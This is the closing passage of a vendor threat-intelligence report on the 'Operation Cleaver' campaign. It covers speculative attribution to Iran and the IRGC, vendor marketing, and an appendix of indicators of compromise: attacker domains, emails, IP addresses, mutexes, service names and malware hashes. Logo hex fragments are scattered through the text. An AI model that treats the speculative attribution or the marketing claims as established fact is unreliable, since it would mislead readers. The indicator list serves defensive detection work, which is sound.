  authorities.
                                     20476 f64
  3. If you have visibility into the attacks on your company and the tools and expertise to track them
                                   6f
  down, leverage the IOCs in Appendix A to identify their presence in your network, prevent them
                                  4
                               4
  from expanding the scope of the compromise, and remove their access immediately.
                          20 into the attacks, need help identifying an existing successful
  4. If you do NOT have visibility
                                c
                              c2
  compromise in your organization, or more importantly wish to prevent this attack or attacks similar
  to Operation Cleaver, please contact your security provider.
                      04576696
  5. If you wish to contact Cylance for additional details not available in this report, please email
  opcleaver@cylance.com.
  6. If you would like to learn more about Cylance products and professional services, or discuss how
  Cylance can mitigate Operation Cleaver
s impact to your organization, please contact us directly.
                   6b2
          +1 (877) 973 - 3336
                 6e
                9
          opcleaver@cylance.com    6
                                  8
          www.cylance.com      546
                                                                                                        61
                                                                              476f6f64
                                                                          6f20
                                                                        44
OPERATION
                                                                      20
                                                                      2c
                                                           b204576696c
CLEAVER
                                                         e6
                                                       96
                                                                         86
                                                                      546
             SPECULATION
 SPECULATION COVER
     TTP COVER HERE
                                   6f20476f6f64
                                 44
                               20
                               2c
                   6b204576696c
                  e
                96
                                  86
                               546
                                                  #OPCLEAVER
#OPCLEAVER
  SPECULATION: THE WHY
  Iran in 2014 can probably be best described as galvanizing. They have long been an 
enemy
  the west, and the United States in particular, but today
s headlines include a variety of topics from
  nuclear talks to human rights to terrorism to cyber hacking. Iran continues to be extremely active on
  the global stage 
 and thereby on the radar of every superpower.10
  Iran
s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard
  dollars combined with national pride to help build their cyber army. Few doubt their commitment
  as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage
  their enemies. And it has been commonly postulated that almost all activity since 2010 coming out
  of Iran is associated with retaliation for Stuxnet/Duqu/Flame, which seems natural given the severity
                                     20476 f64
  of the impact. But they don
t need Stuxnet as motivation to want to hack the world. They have long
                                  6 f
  desired power on the political stage, in particular in the fight for nuclear power autonomy.
  With the deadlines around0
                             44
                            the Iranian nuclear discussions pushed to 2015, the attacks may be tied
                         2 discussing a pact with the nuclear superpowers of United States, Britain,
  to negotiating power when
                               c
                             c2
  France, Germany, Russia and China.
                     04576696
  The inner workings of the Iranian government remain largely a mystery to the western world.
  However, Iran
s control over its people and the private businesses birthed inside has been well
  reported. In a 2014 Reuters article, the reporters detail how the secret Iranian organization called
Setad Ejraiye Farmane Hazrate Emam
 has become one of the most powerful organizations in the
  country, capable of taking over properties and businesses, buying controlling interests in numerous
  sectors including finance, oil, telecommunications and many others totaling in upwards of $95B.11
  Even the US Treasury has documented an extensive fronting of companies in its report of Execution
                   b2
  of Imam Khomeini
s Order (EIKO), which through its two main subsidiaries controls 37 private
                  6
  businesses that are purely front companies for the Iranian government.12
                6e
  The history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is
               9
  well known13, 14. They have controlled much of the country
s Internet access to date and have taken
                                 86
  over controlling interests in those companies to carry out their work. Given Operation Cleaver
                              546
  frequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran,
  and Iran
s well recorded investment in cyber warfare14 leads us to one simple conclusion: Iran is
  extremely active in the world of hacking.
                                                                                                    63
                                                                                                                     476f6f64
                                                                                                                 6f20
                                                                                                               44
OPERATION
                                                                                                             20
                                                                                                             2c
                                                                                                  b204576696c
CLEAVER
                                                                                                e6
                                                                                              96
                                                                                                                86
                                                                                                             546
Speculation: The Why (cont.)
Involvement with North Korean
Operation Cleaver
s intense focus on critical infrastructure companies, especially in South Korea,
hints at information sharing or joint operations with Iran
s partner, North Korea. In September,
2012, Iran signed an extensive agreement for technology cooperation agreement with North
Korea, which allows for collaboration on a variety of efforts including IT and security.6
Cyber Moving to Physical
Operation Cleaver
s carefully selected targets like the oil and gas industry, energy and utility
companies, as well as airlines and airports, indicates Iran
s desire to gain deep access into the
world
s most critical environments. The end goal of this operation is not known at this time.
University Recruitment
University student recruitment was hinted at within Operation Cleaver and is consistent with
Iran
s reported history of active warrior recruitment in the educational space.15
Overall, there are many reasons that Iran may be pursuing the targets they did in Operation
Cleaver. While we may never truly know, it is important to consider all the above and more when
trying to understand the why.
 CONCLUSION
                   6f20476f6f64
                 44
               20
                c
              c2
    b204576696
 6e6
                  86
               546
                                  #OPCLEAVER
                                                                                                                       476f6f64
                                                                                                                   6f20
                                                                                                                 44
OPERATION
                                                                                                               20
                                                                                                               2c
                                                                                                    b204576696c
CLEAVER
                                                                                                  e6
                                                                                                96
                                                                                                                  86
                                                                                                               546
CONCLUSION
After tracking the Operation Cleaver team for over two years, we
re led to the inexorable
conclusion: the government of Iran, and particularly the Islamic Revolutionary Guard Corps
(IRGC), is backing numerous groups and front entities to attack the world
s critical infrastructure.
As security experts in Critical Infrastructure and Key Resources (CIKR), Industrial Control Systems
(ICS), Supervisory Control and Data Acquisition (SCADA) systems, Building Management Systems
(BMS), embedded systems and fixed-function systems, we know how easy they are to hack.
We have worked with countless customers and vendors throughout the years to notify them of
vulnerabilities, assist with remediatation efforts, and help mitigate threats to their environments.
Unfortunately, many critical infrastructure organizations are unable to secure their complex
envirnoments against modern attacks. They fall victim to the 
glue flu
, a malaise of feeling stuck,
not wanting to change the status quo for fear they will find problems that they have no idea how
to prevent. This 
security anaphylaxis
 spells real disaster.
If Operation Cleaver doesn
t get the world to wake up to what is happening in the silent world of
cyber, then perhaps nothing will. Prevention is everything and we should never give up until it
achieved.
Challenge your trusted advisors. Challenge your security vendors. Demand better technology
and services to detect, respond, but most importantly PREVENT not just contemporary attacks,
but future exotic attacks that have yet to be imagined. That is what truly disruptive and innovative
technology is. Don
t settle for anything less.
We hope that by exposing the Operation Cleaver team to the world, current global critical
infrastructure victims can be notified, and prevent future victimization from suffering the
consequences of 
status quo
 security. Unlike United Flight 811, perhaps we can prevent the next
disaster.
                          DEFENDERS, NEVER GIVE UP!
#OPCLEAVER
  REFERENCES
  [1] Aboard Flight 811: Passengers
 Routine Dissolves Into Terror - February 1989
  http://www.nytimes.com/1989/02/26/us/aboard-flight-811-passengers-routine-dissolves-into-terror.html
  [2] 
Forget China: Iran
s Hackers Are American
s Newest Cyber Threat
 - February 2014
  http://complex.foreignpolicy.com/posts/2014/02/18/forget_china_iran_s_hackers_are_america_s_newest_cyber_
  threat
  [3] 
Developments in Iranian Cyber Warfare 2013-2014
 - August 2014
  http://www.inss.org.il/uploadImages/systemFiles/SiboniKronenfeld.pdf
  [4] 
Iran ups cyber attacks on Israeli computers: Netanyahu
 - June 2013
  http://uk.reuters.com/article/2013/06/09/us-israel-iran-cyber-idUKBRE95808H20130609
                                      6  f20476 f64
  [5] 
Iranians hacked Navy network for four months? Not a surprise.
 - February 2014
                                   44
  http://arstechnica.com/information-technology/2014/02/iranians-hacked-navy-network-for-4-months-not-a-surprise/
  [6] 
Iran and North Korea Sign 0
                               2 Technology Treaty to Combat Hostile Malware
 - September 2012
  http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware#
                                  c
                                c2
  [7] 
Iran
s Paramilitary Militia Is Recruiting Hackers
 - January 2011
                        04576696
  http://www.forbes.com/sites/jeffreycarr/2011/01/12/irans-paramilitary-militia-is-recruiting-hackers/
  [8] 
The Iranian Nuclear Weapon
 - January 2014
  http://webcache.googleusercontent.com/search?q=cache:eJbMz7vynpQJ:iranredline.org/index.
  php%3Fid%3D22+&cd=1&hl=en&ct=clnk&gl=us
  [9] 
HPSR Threat Intelligence Briefing Episode 11, February 2014
 - February 2014
  http://www8.hp.com/h20195/v2/getpdf.aspx/4AA5-1589ENW.pdf?ver=1.0
                       2
  [10] 
Intel boss
 warning on cyber attacks no joke, say experts
 - November 2014
                      b
  http://www.foxnews.com/world/2014/11/23/intel-boss-warning-on-cyber-attacks-no-joke-say-experts/
                    e6
  [11] 
Khamenei controls massive financial empire built on property seizures
 - November 2013
                  96
  http://www.reuters.com/investigates/iran/#article/part1
                                    86
  [12] 
Treasury Targets Assets of Iranian Leadership
 - June 2013
                                 546
  http://www.treasury.gov/press-center/press-releases/Pages/jl1968.aspx
  [13] 
Internet Censorship in Iran
  http://en.wikipedia.org/wiki/Internet_censorship_in_Iran
  [14] 
Iranian Internet - Fact and Faction
  http://surveillance.rsf.org/en/iran/
  [15] 
Iran readying hacker attacks on U.S. infrastructure, specialists say
 - April 2012
  http://www.washingtontimes.com/news/2012/apr/25/iran-readying-hacker-attacks-us-infrastructure-spe/?page=all
                                                                                                                    67
                                                                                                                                   476f6f64
                                                                                                                               6f20
                                                                                                                             44
OPERATION
                                                                                                                           20
                                                                                                                           2c
                                                                                                                b204576696c
CLEAVER
                                                                                                              e6
                                                                                                            96
                                                                                                                              86
                                                                                                                           546
 ABOUT CYLANCE
 In the face of growing and evolving threats, traditional cyber protection technologies are now
 widely considered inadequate. The only way to regain the upper hand against a new generation
 of attackers, is to embrace something entirely new. Something that 
thinks
 like an attacker.
 Something that doesn
t rely on a trust model or care about hash lookups. Something with a brain.
                        
The world has combated cyber threats by doing the same
                        thing over and over again ... it
s the definition of insanity!
                           Jeff Moss - Co-Chair of the DHS Community Resiliency Task Force
                               & Founder of BlackHat and DEFCON security conferences
 Cylance has eschewed the old foundations that existing cybersecurity products are built upon.
 Instead, we
ve based our approach on mathematics, machine learning, and data science. This
 algorithmic approach has been proven to detect 
 and stop 
 exponentially more modern threats.
 Leveraging algorithmic risk modeling, CylancePROTECT protects endpoints from everyday viruses,
 worms, trojans, and spyware, but unlike other security products, CylancePROTECT offers true
 future-proof protection against the most malicious threats in the world. Advanced Persistent Threats
 (APT), 0-days, and exotic exploitation techniques are easily detected and halted with little-to-no
 impact on the end-user.
 Existing reactive solutions rely on a constant stream of signature updates for threat detection, which
 is not only costly and inconvenient, but also requires 
sacrificial lambs
. Only after a previously
 unseen threat has inflicted damage can the rest of the industry begin to detect it. CylancePROTECT
 doesn
t require constant updates or even a network connection to protect against so-called
previously undetectable
 threats. By identifying and defusing attacks in near real time, before the
 attack can execute, we can finally do away with the need for a 
patient zero
 As Richard Stiennon, Chief Research Analyst at IT-Harvest, put it, 
Many vendors are trying to solve
 the endpoint problem, yet Cylance is the only one using the power of math to stop malware and
 with more effectiveness and efficiency than current solutions
 Interested in seeing what CylancePROTECT can do for your organization? Contact us!
 Cylance is one of the fastest growing cybersecurity technology firms in the US. Cylance
s flagship product
 CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe. Cylance
 was founded by 27-year security industry luminary, Stuart McClure, former Global CTO of McAfee, original founder
 of Foundstone, and lead author of the international best-selling book Hacking Exposed. In building Cylance, Stuart
 brought together the best scientific and executive minds from the likes of Cisco, Sourcefire, Google and McAfee. The
 Cylance board of advisors includes former high-ranking officials from the DHS, the FBI, CIA, and executive titans of
 business.
#OPCLEAVER
  CYLANCE PRODUCTS
  CylancePROTECT is the only next generation endpoint security product that applies math to
  mute existing and future malware, viruses, worms, trojans, bots, APTs, 0-days, exploits, adware,
  spyware and hacking tools 
 without needing any updates or even a connection to the Internet.
  The technology is founded on the principle that to fix the industry, you must start from scratch with
  a way as yet unseen.
  CylancePROTECT does not rely on signatures of any sort (blacklist or whitelist), behavioral
  analysis using IOCs, sandboxing analysis, heuristics, micro-virtualization, or dynamic detonation 
  to detect and prevent malicious files from executing on a target endpoint.
  While every other endpoint security product must collect a sample, analyze, and write a signature
                                  f20476 f64
  to detect it, CylancePROTECT can detect malware before it executes by statically analyzing
                                6
                               4
  features found in the binary itself.
                            4
                           0
  Features and Benefits of2CylancePROTECT:
                               c
                             c2
 Near real time detection of malicious files, even if they
ve never been seen in the wild.
                     04576696
 Can be used to augment existing endpoint security or be deployed as a complete replacement.
 Does not require any signature updates or connection to the cloud.
 An easy-to-use web management console with intuitive workflows.
 Low-impact endpoint agent.
  For a demo of CylancePROTECT, contact a Cylance expert today!
                  6b2
                6e
               9
                                 86
                              546
                        Figure 26: Cylance products detect and stop all the malware used in
                        Operation Cleaver, even though the vast majority of the samples are
                      completely missed by the antivirus industry as of this report
s publication.
                                                                                                     69
                                                                                                                                    476f6f64
                                                                                                                                6f20
                                                                                                                              44
OPERATION
                                                                                                                            20
                                                                                                                            2c
                                                                                                                 b204576696c
CLEAVER
                                                                                                               e6
                                                                                                             96
                                                                                                                               86
                                                                                                                            546
 CYLANCE SERVICES
 Cylance
s Professional Services team is available to assist companies affected by this campaign.
 Cylance is providing consulting to companies that may have been targeted by these advanced
 threat actors. Cylance will perform initial triage in order to determine the extent to which your
 company has been affected by this campaign and work towards establishing a containment
 strategy.
 Cylance has two tailored offerings for clients affected by this campaign. The first one includes
 ICS in our incident response since many companies affected are in the Critical Infrastructure and
 Key Resources (CIKR) vertical. The second offering
s focus is to deploy our proprietary tools and
 methodologies to detect and mitigate the threats posed by Operation Cleaver.
 Option 1: ICS Incident Response & APT Detection and Mitigation
 Option 2: Detection, Remediation, & Mitigation
 For more information on how the Cylance Professional Services team can assess and respond to
 attacks like the ones obseved in Operation Cleaver, contact sales@cylance.com today.
                                                                           INCIDENT RESPONSE
     COMPROMISE ASSESSMENTS                                                Stop the threat, mitigate risk,
                                                                           and remediate.
     Uncover previously undiscovered
     breach and damage.
     PENETRATION TESTING
  Check the integrity of your
  environment and infrastructure.                                          FORENSIC INVESTIGATIONS
                                                                           Dig into who, what, where, and
                    CUSTOM SERVICES                                        when a compromise occurred.
                     Get expert help that addresses YOUR security needs.
#OPCLEAVER
  ACKNOWLEDGMENTS
  Brian Wallace
  Brian is a Sr. Security Researcher for Cylance who joined shortly after the company was established.
  He is best known for his avid botnet research (often going by 
botnet_hunter
) and for his novel
  malware analysis in the A Study in Bots blog series hosted by Cylance. Brian has been a dedicated
  open-source developer as well as an advocate for public and private anti-botnet operations.
  Brian actively develops techniques to combat cyber oppositions in positions where resources and
  leverage are in too limited of supply for conventional means. These techniques, cultivated by Stuart
  McClure, are the Art of Deterrence. In a previous investigation, Art of Deterrence techniques were
  successfully used to divert Indonesian hackers motivated by monetary gain away from their highest
  yielding target group.
                                  6f20476 f64
                                 4
  Brian
s botnet research covers a wide range of topics, from using graph analysis to estimate
                                4
                              20
  the amount of ransom that has been paid to a ransomware operator, to utilizing IPv4 scanning
  techniques to identify and take down point of sale malware panels.
                               c
                             c2
  Stuart McClure
                     04576696
  Stuart is founder, CEO/President and Chairman of Cylance. Widely recognized for his extensive and
  in-depth knowledge of security products, Stuart McClure is considered one of the industry
s leading
  authorities in information security today. A well-published and acclaimed security visionary with
  currently eleven books in print, McClure is the originating founder of the Hacking Exposed series
  of books, the most successful security book ever written. From his work, he founded Foundstone in
  October of 1999 which sold to McAfee in 2004.
                    2
  McClure brings over two decades of technology and executive leadership with profound technical,
                   b
  operational, and financial experience. Besides Foundstone, Stuart held leadership positions at
                  6
  InfoWorld, Ernst & Young, Kaiser Permanente and a number of government agencies. At McAfee,
                6e
  McClure held numerous positions including SVP/General Manager for the Security Management BU
               9
  as well as EVP/Global Chief Technology Officer responsible for almost $3B worth of revenues.
                                  6
  Today, McClure is CEO of Cylance, a disruptive and innovative startup applying math to the problem
                                 8
                              546
  of security. Cylance products such as CylancePROTECT prevent the most advanced attacks in the
  world without signatures or sandboxing in realtime on the endpoint. Cylance Services offer highly
  specialized security services such as incident response, forensics, compromise assessments and
  advanced penetration assessments for global critical infrastructure.
  Cylance Team
  Cylance employees work passionately and tirelessly every day to achieve one goal: Protect the
  world from cyber attacks. And with their efforts in tracking Operation Cleaver, they have achieved
  that goal. Our endless thanks to all the Cylancers who contributed to this report.
                                                                                                   71
                                                                                                                                    476f6f64
                                                                                                                                6f20
                                                                                                                              44
OPERATION
                                                                                                                            20
                                                                                                                            2c
                                                                                                                 b204576696c
CLEAVER
                                                                                                               e6
                                                                                                             96
                                                                                                                               86
                                                                                                                            546
 THE OPERATION CLEAVER LOGO
 The Operation Cleaver logo, created by Cylance specifically for this report, was inspired by the
 infamous logo used by the Army of the Guardians of the Islamic Revolution, also known in the
 west as the Iranian Revolutionary Guard Corps (IRGC). Due to the close connection between the
 members tracked in this report and the IRGC, it was only fitting to replicate the look and feel of the
 IRGC
s iconography as the anchor for this document
s branding.
                                                                                       20476f6f64
                                                                                   446f
                                                                                 20
                                                                                  c
                                                                                c2
                                                                        04576696
                                                                    e6b2
                                                                  96
                                                                                    86
                                                                                 546
       Army of the Guardians of the                                    Operation Cleaver
         Islamic Republic (IRGC)
                                                          Several of the visual elements present in the IRGC
 The striking visual elements that make up the logo       logo have been carried over to the Operation Cleaver
 of the IRGC have very specific meanings:                 logo including:
   The clenched fist holding a rifle, most likely an   
   A clenched fist, this time holding a cleaver,
      AK-47, represents armed resistance.                      represents the group
s likely connection with the
   The globe symbolizes the IRGC
s worldwide                IRGC as well as armed resistence in general.
      ambitions.                                          
   The globe in the background represents
   The book, from which the clenched first                  Operation Cleaver
s worldwide reach.
      emanates, represents the Qur
an, connecting         
   An ethernet cable connected to the clenched first
      the religious ideals on which the group was              represents the nature of these attacks (cyber as
      founded to the armed struggle.                           opposed to traditional warfare).
   The plants, possibly wheat, represent               
   The hex string translates to 
Think Evil, Do Good
      prosperity.                                              a mantra our research team lives by.
   The name of the group in Persian, the year in
      which it was founded and a passage from the
      Qur
an (8:60) 
And make ready against them all
      you can of power
, are represented in text.
     APPENDIX A:
INDICATORS OF COMPROMISE
                      6f20476f6f64
                    44
                  20
                   c
                 c2
       b204576696
    6e6
   9
                     86
                  546
                                     #OPCLEAVER
                                                                                                              476f6f64
                                                                                                          6f20
                                                                                                        44
OPERATION
                                                                                                      20
                                                                                                      2c
                                                                                           b204576696c
CLEAVER
                                                                                         e6
                                                                                       96
                                                                                                         86
                                                                                                      546
Indicators of Compromise (IOC)
This Appendix details the IOCs discovered in the investigation of Operation Cleaver.
CylancePROTECT prevents the malware used in Operation Cleaver from ever executing.
Domains
doosan-job(dot)com
downloadsservers(dot)com
drivercenterupdate(dot)com
easyresumecreatorpro(dot)com
googleproductupdate(dot)com
googleproductupdate(dot)net
kundenpflege.menrad(dot)de
microsoftactiveservices(dot)com
microsoftmiddleast(dot)com
microsoftonlineupdates(dot)com
microsoftserverupdate(dot)com
microsoftupdateserver(dot)net
microsoftwindowsresources(dot)com
microsoftwindowsupdate(dot)net
northropgrumman(dot)net
teledyne-jobs(dot)com
windowscentralupdate(dot)com
windowssecurityupdate(dot)com
windowsserverupdate(dot)com
windowsupdateserver(dot)com
www.gesunddurchsjahr(dot)de
Email Addresses Used for Domain Registration
davejsmith200(at)outlook.com                     tarh.andishan(at)yahoo.com
salman.ghazikhani(at)outlook.com                 ahmadi(at)odeconline.com
btr.8624(at)yahoo.com                            kafe0(at)yahoo.com
ghanbarianco(at)gmail.com                        dg_co(at)yahoo.com
azlinux73(at)gmail.com                           zahiry_alireza(at)yahoo.com
domain(at)netafraz.com                           zahiry.alireza(at)gmail.com
#OPCLEAVER
 Email Addresses Used for Exfiltration
 testmail_00001(at)yahoo.com
 TerafficAnalyzer(at)yahoo.com
 dyanachear(at)beyondsys.com
 IP Addresses
 50.23.164.161                    95.211.191.225
 64.120.128.154                   95.211.191.247
 64.120.208.74                    95.211.241.249
 64.120.208.75                    95.211.241.251
                                   20476 f64
 64.120.208.76                    108.175.152.230
 64.120.208.78
                                46f
                                  108.175.153.158
 64.120.208.154                4  159.253.144.209
 66.96.252.198
 78.109.194.114
                             20   173.192.144.68
                                  174.36.195.158
                              c
                            c2
 80.243.182.149                   184.82.158.18
 87.98.167.71                     184.82.181.48
                    04576696
 87.98.167.85                     188.227.180.213
 87.98.167.141                    192.111.145.197
 88.150.214.162                   203.150.224.249
 88.150.214.166                   207.182.142.68
 88.150.214.168                   212.87.154.12
 88.150.214.170                   212.87.154.14
                 6b2
 Mutexes
               6e
              9
 ZSC1                           86
 Adobe Report Service
 Bmgr
                             546
 Dynamic Mutexes
 These mutexes are used with the process ID of the malware as a suffix:
 demdaramdidam
 ILoveThisMutex
                                                                          75
                                                                                                              476f6f64
                                                                                                          6f20
                                                                                                        44
OPERATION
                                                                                                      20
                                                                                                      2c
                                                                                           b204576696c
CLEAVER
                                                                                         e6
                                                                                       96
                                                                                                         86
                                                                                                      546
Installed Services Names
COM+ System Extentions
COM__System_Extentions
Network Connectivity Manager
Service1
MsNetMonitor
Pcapins
scManagerSvc
CredentialSync
Adobe Report Service
Samples (MD5)
Listed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver.
01606d42c64e4d15ea07d4e1fbd0c40d
0405adfc8739025ba88c746c8edebfb8
04fdf5b757764af8bc7ef88e0f8fe8c1
0512c5a8807e4fdeb662e61d81cd1645
0593352cadb2789c19c2660e02b2648b
08eabb6164b1b12307931e4f2d95f7c6
0900c3319e4c46ff9478e3e1fa9528a1
0acd8945bd162e5e7aa982cddbd8ecaa
0ad6a01a916f14fc24fa43e46813b3bb
0b2cbfa07fa9a090b35a3dfdb0ebad9d
0b80a8d2c56789b4bda9a56a53e7e2b1
0f4b526d8edf1d3d32c81a692c325733
10d019932fc43e9b39be709f8281203d
1223e93dd4a5ad0536c8232936cb35fe
144064951cceaf1bb81e8f215de76101
14a80287490f3a68d99c0f518b246fd2
17d1f25185b31044eb89a99d50d36a26
18942a44d2b5f2bbf54e2c18ac293915
18efd3f66d23c5c555e128a19de63667
19d9b37d3acf3468887a4d41bf70e9aa
1c2bc564805695dbb3a26d9c9f7dffea
1c7e40443e36c4b7592617f0a271835d
1d8fd8c357907a79f3e6d9f831f2bd7d
21829130d5e2a69b0f6963c68b070127
2e36a3f3b888c1fd3c3aa3f1ba7969ad
30120cf30ea4d870635893cd75338f97
304f7f17031af90012d4e4d1cc5cfb8a
336b501bd96e309f93c8d12960634248
38998ff6f9a3874b6943d7ac837d19c3
#OPCLEAVER
  Samples (MD5) cont.
  3b6260ead85b4f0d706203e062a34a21
  41eeae4158152f49ab64601c4358a7a1
  42714874f86fa9bd97e9be460d7d72c0
  42e459d1d057bd937e0d00958e591f08
  48dd515e2b148493cf47b0c0c5713573
  491f031d0a9ad4919cb29cb2d9a9a65c
  4e483762f555b078976a1ddf3fc3e532
  53230e7d5739091a6eb51298a50eb616
  537b42d3cd9812e5b583131b83a48508
  53841511791e4cac6f0768a9eb5def8a
  54def27d598b75f297a8cf2c97150997
  5837ad676f6c0f0f4f48096648d6e81b
                              6f20476 f64
  5a4046fd0825641766b197a2132d2410
                            44
  5e5d6469b270aa60dc90ddfde32ba082
  5eef1ee37714c9ee07653419890010d6
                          20
  6061410c04b9fa9e47593611a02ff2dd
  6094f64d54575a2d5a3fbd2d23c4f44e
                           c
                         c2
  61896424e995476b23f73a5c1c34af5e
                 04576696
  61e307a651a7bbce78eb48c1d395501a
  636c2d2855ac8a8693c4ef9e89c67205
  641fc6831d8c215e9645cf5d4a8be5e5
  68cfc418c72b58b770bdccf19805703e
  69d80a27ab0c85ef073badbee7ec55c7
  69f9705ecdcc709506f7665ad373c1a0
  6cd5f1982693f2ce21effddf18f5baf5
                2
  6d4d21258eef96979ce6f2417c6c019f
               b
  6ef950941d114c09af359402620d7cba
              6
  735cdf3a3e9c06d88de31112782ef831
             e
  736aab6c731d098931d6a4bf11a8150e
           96
  758f2557922e360bff3d1565e6871ea1
                              6
  765f3db4421bdf8bb953dffe37398453
                             8
                          546
  78a63bc8433cea162e31a5865d5817c9
  836ef6b06c5fd52ecc910a3e3408004a
  84384d77ac9835720375943235d33a87
  855239a2434a3bc78751d9ba9cfac900
  8994e16b14cde144a9cebdff685d8676
  9376e5b754ccd94f7c66b811d81e240e
  948c570269059928517f155b4b6db1a4
  94ef4f98b9c321f74778811f64c68d03
  96e372dea573714d34e394550059b1d7
  9838f7ead2023061eb79587243910daa
  985e86ac1854585d2771fd173b63b98b
                                            77
                                                          476f6f64
                                                      6f20
                                                    44
OPERATION
                                                  20
                                                  2c
                                       b204576696c
CLEAVER
                                     e6
                                   96
                                                     86
                                                  546
Samples (MD5) cont.
9a48bee62c41c0640e9564cc37f718bf
9bcb8091ba414a38bfb7a39eccf3f6bc
9e00a52caec6385e0ab1e21e9794a5b0
9ef9ec11c9f83dde38556feaf88b2a29
9feee6fe54ee4ec859f7bad0d798ac4e
ad94daecadbac8a54e81a69cacc41441
ad99db10c0c12eaea09b39568a761b52
adf77661a409b5a1304d08b62a1264f5
af58d803b2e0b5d0f194c25ff85a8d81
afdfafb2c1e2af1a48e833da8f35bb83
b163fcda16d8fe860a906f768ef27bc8
b2d78ecce135e008adc3e80915f69798
b3d5e1ff7a7ff10cd738b215f92d1ad5
b7ddb09bdc0d0eb39c364d9b9d6436cc
baa76a571329cdc4d7e98c398d80450c
bd9fbbbd7dab62ed6a56d00f21c4c67e
be6273ebd472a2a499a6c1e48ae81112
be741520f13a2bf8bc064a73e146bf08
bfc59f1f442686af73704eff6c0226f0
c1b5464c0506bea6cf778dd18fa456cc
c440ec0a8cf7341b746160a684c51741
c5282f088b90de1ab758424b152d34ac
c91887d861d9bd4a5872249b641bc9f9
cb52f84d462ac67bde53eec40128408c
cbe05db979444589211e830487df7610
d000071a6bf49da390fef8f12aa9e3f8
d84c3d678f269a0c6beb22ed266efac0
de56ca66423fc5e42808445f2b5631d3
de56ca66423fc5e42808445f2b5631d3
de744bcb7c63b035b6c5c3ec0279c3ac
e0f6c5fdde04fbf8cd1a42f75cb06248
e4c9e8f28894e89d6270ad6a4c6cd064
e4e5f1efe44ac06bc3672fd1d8f85630
e5428bcae8b4e84cb5186ad5c83ffc98
e7428dec7deb041692d6575e069c1cf0
e8b1f23616f9d8493e8a1bf0ca0f512a
e8ea10d5cde2e8661e9512fb684c4c98
eac61634da4513a10b596e6c8c299126
eb48c318e8fd9a2a7a18da6578db05d6
f1301bad6da06f436e3a3de0244848e1
f3d80d813dc6a239d921169c57c5789d
fa7c9a78eda0f3bb9ff8ec827d5bc9ff
#OPCLEAVER
  Samples (SHA-256)
  039ce41fb40a27a46c43bf7ef7d1b08cd5e3f6d71ec08e140cd9166247e783af
  0510efd8eae869cd0773a033d5a46d6b7f0162174019e54618887f3085312fcb
  064e47074342a6e026de068adaf48c41b2ec2c341c7514768cb7b39425905524
  08065f658d65773e583e9ca784148117d87be3a5005a0871cbc4446f42ed5040
  0ce968ea8cffb6312f6d17af9044a14f79d6427b9038bcfc6212acb5aa23e74b
  0d1f479842cd5bde4f18ab8c85a099da39e13a4051a7c21334e33d55b6f18d76
  0fee562cd821f53e864e02b00a59780aed63abca9f7502678fca9bf47b8b12bd
  10647c4e7b1b741aeaea9b16d8eb5dae3237ce00dc69f6843790767a277b6204
  10cf7a186897243363278cf0283a1687749d9ba43fa713b9f974050f56e97cca
  15121b7cbd15143fc0118e06ebe70b7dc1e239b21d865b2c750ed8a0f1f00ef2
  1578a4c641f0c7913cdf08267d1a88ac384d586c453b922670be380b7e67a179
  1698d8168e860c3377646b12444d38a2e6aebba5a499504a5fc0a73b91d89407
                               f20476 f64
  1756ba79cd63458a50df86203380824ea855c8d6bf1c673e05a13a62f14cd170
                              6
                             4
  1aa25a930e8bae5abbe75907c335c7d1d875b60f72f02855a8d37daadc6b469f
                            4
                          20
  1efad3bce90ac1d2011ba686f1ab0e435b9a709763fb238dbcad0f44acddccbe
  20dddd8651a26161139b49dfabfb3b4b743c57fcc982afc11d1c5c4264a2a8be
                           c
  2a13730f8f16e04cece490eee53bbdcc9bd1e01fbbc2a758562a6462d9473742
                         c2
  2db6f74a8aef9fe86aef5dff3334e8dd252ac45e26b4a12e8641a770bbb08b45
                 04576696
  2e32c6c9179750df7f1ab35536f09c6b09c73faccea7325fe5c79b5087f5dd6f
  32aa8f19e452a1471640cd7be72f806e1997fd5a1a2b2743898ee4cd0aed0dc5
  37af3f3b3c43690a2e73d4b5edb968896ec4da7b2c21b12a94e146a10f07fef8
  39ba1710545fc9e123abbbce61bda1b00525e59346570a3f8c36f7adde5bb47e
  3a7ebd7f502fd3f6b3b88693b1123147621b4030c21df9e0690864e8969e149a
  3bdbf591fa0d81606929fdf6abe44ba6e185dd8fc0fa62ade8afde48f704d11a
  3d18e18ae97045cc3198026ddc681e7d957a25402b79141a3c6fdc18bb879ad6
                2
  3fa302449da1e4fad81143cc48fc80034cbc41804f00e00ac17bdb7dba0b992d
               b
  42ca980b7fc7892716a923c7bf3ff6a76ce81f81bd0a83bea40a1735f33b36b8
             e6
  45a2ea5226c1ce11e8955c99d5b58fd3baa66fb53436be63cb099e96ef30db43
            6
  48437fe7d7d0c5fbde340e1392662f7fc421fc05d7c9824f71160475105ad999
           9
  4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1
                             86
  508c7691d535102538aaa6dce32d750c2492dada36506a390c1959f261a0244b
                          546
  50d11ad32eb72b128185a0aecf39be8085b6b1a8f30cb41d8bc177a1ff8f3067
  550a33353730579a7d2b9276cc3b66ca252a59e198285c732fcda46513351c03
  5ac9f4e25ef4002274496e18ea537b4c582a3acf3126cc1830a63941d9c91e64
  5d1e81f5a4fca25b7afb18eb906c9a53965d81dcf62f9d91499baf03229a8de8
  5fb4ae33cac8b2b74e63fc639eeb969a660ef9a7e8310c2769acc925122f047e
  616a25378f70474bcb3ad0fad2f1383009c5b7b3cea937be2a5234a110d64b78
  634685e43e9f73343cb337ec64a8679485e1ddb4c2de5ecb6a5746aa5ddb1b72
  6474f74340e7199919e7532c6756cf459cd20c3391852d80b058eb7997a31e9f
  650f143ac0a668536b6750a628ec51e7ca28f5520105eeb87308f557cd74e63c
  65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976
                                                                     79
                                                                                          476f6f64
                                                                                      6f20
                                                                                    44
OPERATION
                                                                                  20
                                                                                  2c
                                                                       b204576696c
CLEAVER
                                                                     e6
                                                                   96
                                                                                     86
                                                                                  546
Samples (SHA-256) cont.
65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976
